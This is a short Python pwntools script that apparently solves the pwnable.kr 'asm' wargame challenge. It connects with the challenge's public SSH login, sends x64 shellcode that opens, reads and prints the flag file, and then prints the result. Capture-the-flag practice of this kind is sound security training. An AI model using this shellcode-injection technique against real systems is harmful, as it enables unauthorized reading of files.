# coding = utf-8

import pwn

def main():
	pwn.context(arch='amd64', os='linux')
	mssh = pwn.ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
	attack = mssh.connect_remote('0.0.0.0', 9026)
	shellcode = pwn.shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
	shellcode += pwn.shellcraft.open('rsp', 0, 0)
	shellcode += pwn.shellcraft.read('rax', 'rsp', 1024)
	shellcode += pwn.shellcraft.write(1, 'rsp', 1024)
	attack.recvuntil('give me your x64 shellcode: ')
	attack.send(pwn.asm(shellcode))
	print attack.recvall()

if __name__ == '__main__':
	main()
